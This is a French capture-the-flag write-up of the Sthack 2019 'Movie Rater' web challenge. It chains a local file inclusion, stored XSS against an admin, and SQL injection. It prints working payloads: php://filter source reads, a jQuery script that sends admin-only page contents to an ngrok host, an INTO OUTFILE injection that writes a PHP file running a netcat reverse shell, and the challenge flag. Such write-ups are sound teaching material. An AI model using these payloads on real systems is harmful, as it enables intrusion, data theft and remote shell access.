---
title: "Write up - Movie Rater - Sthack 2019"
---

Dans cet article, je vais vous présenter le write up d’une épreuve web du CTF de la Sthack 2019, un événement dédié à la sécurité informatique sur Bordeaux qui s’est déroulé le 14 Juin 2019.

Avant de commencer l'explication de ce challenge, je tiens à remercier la [@TeamCryptis](https://twitter.com/TeamCryptis "Twitter team cryptis") de m'avoir accueillie au sein de leur équipe durant ce CTF et avec qui j'ai pu réaliser cette superbe première place.

![Classement](/assets/images/sthack_2019/classement_sthack_2019_bis.jpg)

On peut remercier [@sth4ck](https://twitter.com/sth4ck "Twitter de la sthack") pour cette magnifique photo du classement 2019. ;)

# Etape 1 : Tour d'horizon du challenger
Movie rater est un site où l'administrateur donne sa note sur les films de "hacker" préférés. Ce site est composé de trois pages accessibles pour le visiteur. Nous verrons par la suite qu'il existe d'autres pages utilisées par l'administrateur. Voici les trois pages:
* Home : La page home qui n'a pas beaucoup d'intérêt
* Movies : Cette page affiche toutes les affiches des films et leurs notes.
![Page movies](/assets/images/sthack_2019/movie_rater_page_movies.png)
* Rate : Cette page montre la photo de l'affiche et sa note ainsi que champs textbox pour donner son avis sur la note du film si le visiteur n'est pas d'accord avec la note donnée.
![Page rate](/assets/images/sthack_2019/change-rate.png)

# Etape 2 : La faille LFI
Après ce tour d'horizon du site, on remarque que les pages Movies et Rate sont appelées via le paramètre GET "page=". On ajoute le caractère apostrophe à la fin de la valeur du paramètre. Nous pouvons voir que la page affiche une erreur montrant qu'il y a une faille au niveau de l'inclusion php des pages, la première faille du site est donc un LFI ([Local File Inclusion](https://fr.wikipedia.org/wiki/Remote_File_Inclusion "Wikipédia Local File Inclusion") )

![Page rate](/assets/images/sthack_2019/faille_lfi.png)


Pour rappel une LFI permet notamment de lire le code php de la page à grâce aux fonctions de filtrage de PHP. Pour récupérer le code des pages du site, nous allons utiliser le filtre base 64 de PHP comme ceci:
{% highlight php %}
php://filter/convert.base64-encode/resource=movies
{% endhighlight %} 
Toutefois, pour que cela fonctionne, il faut faire un urlencode de ce payload.
{% highlight php %}
php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dmovies
{% endhighlight %} 

# Etape 3 : Lecture des fichiers php
## index.php
Dans l'index.php, nous pouvons voir la faille LFI qui nous a permis de récupérer les fichiers php. On remarque qu'il n'y a aucun contrôle sur les entrées utilisateur dans le paramètre "page".

{% highlight php %}
<?php if(isset($_GET['page'])){include($_GET['page'].'.php');}else{?>
{% endhighlight %} 

## head.php
Petit détail amusant, un blocage de SQLmap apparaît dans le fichier head.php. Bah oui, on est à la Sthack, tu vas quand même pas t'amuser à utiliser un outil qui te permet de te l'a couler douce la main dans le slip pendant le CTF !.
{% highlight php %}
<?php
	$user_agent = $_SERVER['HTTP_USER_AGENT']; 

	if (stripos( $user_agent, 'sqlmap') !== false)
	{
	    die("Hmm Hmm");
	}
?>
{% endhighlight %} 

## rate.php
Ce fichier rate.php correspond à la page d'affichage et commentaire de la note du film. Dans celle-ci, nous pouvons voir plusieurs choses intéressantes. 

Premièrement, il y a un contrôle des entrées utilisateur au niveau du paramètre "id" de l'URL. Seul des chiffres peuvent être entrés dans ce paramètre. Donc ce n'est pas une voie utilisable pour la réussite de ce challenge.
{% highlight php %}
<?php
	if(!preg_match("/^[0-9]{1,2}$/", $_GET['id']))
	{
	  die('<center><h1>Do not hack me !</h1></center>');
	}
?>
{% endhighlight %}

Deuxièmement, on peut voir que le commentaire envoyé à l’admin passe par une page nommée : change-rate.php
{% highlight html %}
<form  class="form" method="post" action="/change-rate.php?id=<?php echo $res['id']?>">
  <textarea class="form-control" name="comment"></textarea>
  </br>
  <input type="submit" class="btn btn-block"/>
</form>
{% endhighlight %}

## change-rate.php
Récupérons donc le code de cette page à l'aide de la faille LFI !

Dans le code cette page, nous voyons que le commentaire est stocké dans une table qui semble temporaire et qui va permettre à l'administrateur du site de lire ce commentaire.

{% highlight php %}
<?php
	$req = $bdd->prepare("INSERT INTO comments_to_be_reviewed (movie_id,comment) VALUES (:id,:comment)");
	$id = movieId(intval($_GET['id']));
	$req->bindParam(':id',$id);
	//add filter to escape SQLi
	$req->bindParam(':comment',$_POST['comment']);
	$req->execute();
	echo "Your comment is under review by an administrator";
?>
{% endhighlight %}

Cela peut signifier que l'administrateur va lire les commentaires envoyés et que par conséquent qu'il peut y avoir une faille XSS à l'ouverture ceux-ci.

# Etape 4 : Tester de la faille XSS
Pour tester si la faille est présente, on va envoyer le payload suivant:
{% highlight js %}
<script> window.location = "http://XXXXXXXX.ngrok.io"</script>
{% endhighlight %}

Ce payload va simplement rediriger l'administrateur vers une autre adresse. Ici j'utilise le logiciel ngrok qui permet de créer un tunnel de son localhost vers internet, c'est très pratique lorsque l'on veut partager un site en cours de développement en local via internet.

Ici l'utilisation de ngrok va permettre de voir les requêtes effectuées sur notre adresse à grâce au panneau de suivi d'activité du logiciel.

![viewing_panel](/assets/images/sthack_2019/ngrock-test-lfi.png)

Nous pouvons voir que deux requêtes sont arrivées, cela signifie qu'il y a bien une faille XSS lorsque l'administrateur lit les commentaires. 

Exploitons cette faille pour connaître le code de la partie accessible par l'admin. Pour cela, on va récupérer le nom du fichier php utilisé pour lire les commentaires. Comme ceux-ci:

{% highlight js %}
<script> window.location = "http://XXXXXXXX.ngrok.io?location="+ window.location.href</script>
{% endhighlight %}

À la réception de la requête, on récupère /the-admin-secure-interface/review_comment.php.

# Etape 5 : Lecture des fichiers accessibles par l'admin
La lecture du fichier review_comment.php ne montre rien d'intéressant pour la résolution du challenge mise à part la faille XSS.

En effet, la page récupère le commentaire et affiche le commentaire sans le contrôler ce qui a été écrit.
{% highlight php %}
<?php
	$read = $bdd->query('select comment,movie_id from comments_to_be_reviewed LIMIT 1');
	
	while($r=$read->fetch()){
?>
	<p><?php echo $r['comment']; ?></p>

<?php	
	$del=$bdd->exec("delete from comments_to_be_reviewed where movie_id='".$r['movie_id']."'");
	}
?>
{% endhighlight %}


La page review_comment.php ne donnant rien, explorons la page /the-admin-secure-interface/index.php. Une fois le dump effectué on peut voir qu'il existe une page nommée /the-admin-secure-interface/stats.php.


## /the-admin-secure-interface/stats.php
Le dump de cette page révèle que cette page affiche les statistiques d'un film. Mais ce qui saute aux yeux, c'est qu'il y a une faille SQLi lors de la récupération des informations.

{% highlight php %}
<?php 
	$req = $bdd->query("select name,rating from movies where id='".$_GET['stats_id']."'");
	$res = $req->fetch();
	print_r($res);
?>
{% endhighlight %}

On peut voir que le paramètre GET est directement concaténé avec la requête SQL et qu'une nouvelle fois, il n'y a aucun contrôle sur les entrées utilisateur et aucune utilisation d'une solution sécurisée comme [PDO](https://www.php.net/manual/fr/book.pdo.php "Documentation de PDO") pour les requêtes SQL.

# Etape 6 : Exploitation de la faille SQLI
Pour exploiter cette faille, il faut avoir accès à la page mais seul l'administrateur peut accéder à cette page.

![cannont_access_stats](/assets/images/sthack_2019/cannot-access-stats.png)


Pour ce faire, il faut passer par la faille XSS pour forcer l'administrateur à effectuer l'attaque. Ce qui fait que l'exploit va se dérouler en trois étapes :
* Envoi de l'exploit via le commentaire et lecture du commentaire par l'administrateur
* A la lecture du commentaire, récupération en GET de la page stats.php avec en paramètre de la page, l'exploit SQLi
* Envoi du résultat de la requête GET en POST vers ngrok, pour que l'on puisse lire le résultat de l'exploit

## Présentation de la structure de l'exploit
Avant d'exploiter la faille SQLi, regardons de plus près la structure du payload.

{% highlight js %}
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
	<script type="text/javascript">
		$.get("/the-admin-secure-interface/stats.php?stats_id=1", function(data, status){
	    	
			$.post("http://XXXXXXXX.ngrok.io",
		  	{
			    html: decodeURIComponent(data)
			},
			function(data, status){});
	  	});	
	</script>
{% endhighlight %}

La première ligne permet d'inclure JQuery dans la page afin de simplifier l'envoi des requêtes GET et POST. Ensuite, la requête GET déclarée avec le $.get qui va retourner dans son callback le code html de la page stats.php. 

Dans ce même callback, on déclare la requête post ($.post) qui va nous renvoyer ce code html. Avant le renvoi vers ngrok, le code html est décodé (decodeURIComponent) pour ne pas à avoir à le décoder à chaque lecture de la requête.

Maintenant que nous avons mis en place notre structure pour exploiter la faille SQLi, il faut chercher à comment exploiter cette faille. Le site n'ayant pas d'interface de login connu, inutile de chercher le mot de passe de l'administrateur dans la base de données. On va donc upload un reverse shell sur le serveur, ce qui est plus utile et plus fun que de récupérer un mot de passe.

## Connaître le nombre de colonne de la requête
Avant de pouvoir upload quoi que ce soit sur le serveur, on doit trouver le nombre de colonnes de la requête qui récupère les statistiques. Pour cela a modifié l’URL de la requête GET.

Essai avec une colonne.
{% highlight js %}
		"/the-admin-secure-interface/stats.php?stats_id=' union select '666"
{% endhighlight %}

Il y a une erreur php, ce qui signifie que ce n'est pas une colonne. Tentative pour deux colonnes :

{% highlight js %}
		"/the-admin-secure-interface/stats.php?stats_id=' union select '666', '667"
{% endhighlight %}

Cette fois le retour de la requête ne revoie aucune erreur, cela signifie qu'il y a deux colonnes à la requête.

## Upload du reverse shell
Maintenant que l'on connaît le nombre de colonnes, nous allons pour pouvoir upload le reverse shell à l'aide de SQL. En effet, le langage SQL permet de pouvoir écrire des fichiers à l'aide de INTO OUTERFILE, ce qui va permettre d'upload un fichier php qui va ensuite permettre d'obtenir un reverse shell.

{% highlight js %}
		"/the-admin-secure-interface/stats.php?stats_id=1' union select '', '<?php system(\"nc -e /bin/sh <ip> <port> \")?>' INTO OUTFILE '/tmp/rs.php"
{% endhighlight %}

Comme nous pouvons le voir, au chargement du script php, le script va exécuter la commande netcat vers notre ip (en écoute sur netcat), ce qui va une fois la connexion établie nous donner un bash.

# Etape 7 : Récupération du flag
Pour établir la connexion reverse shell, il faut exécuter le code php. Pour cela, on utilise la faille LFI pour charger le script.

{% highlight js %}
		"?page=../../../tmp/rs"
{% endhighlight %}

Une fois la connexion établie et après une recherche dans les dossiers du serveur, on tombe sur /home/acid_burn qui possède un binaire nommé getFlag.

On execute le binaire et nous demande un pseudoterminal([TTY](https://fr.wikipedia.org/wiki/Pseudo_terminal "Wikipédia pseudoterminal") ) pour s'exécuter.

Il y a plein de façon d'obtenir un shell TTY, le site  [netsec](https://netsec.ws/?p=337 "Liste des shell pty") à lister plusieurs façons d'obtenir un pty shell. Pour ce challenge, on utilise python en faisant :

{% highlight bash %}
	python -c 'import pty;pty.spawn("/bin/bash")'
{% endhighlight %}

Une fois le shell TTY obtenu, on peut exécuter le binaire est récupéré le flag :

{% highlight text %}
	Sql14nDAC5RF_R3alY?!
{% endhighlight %}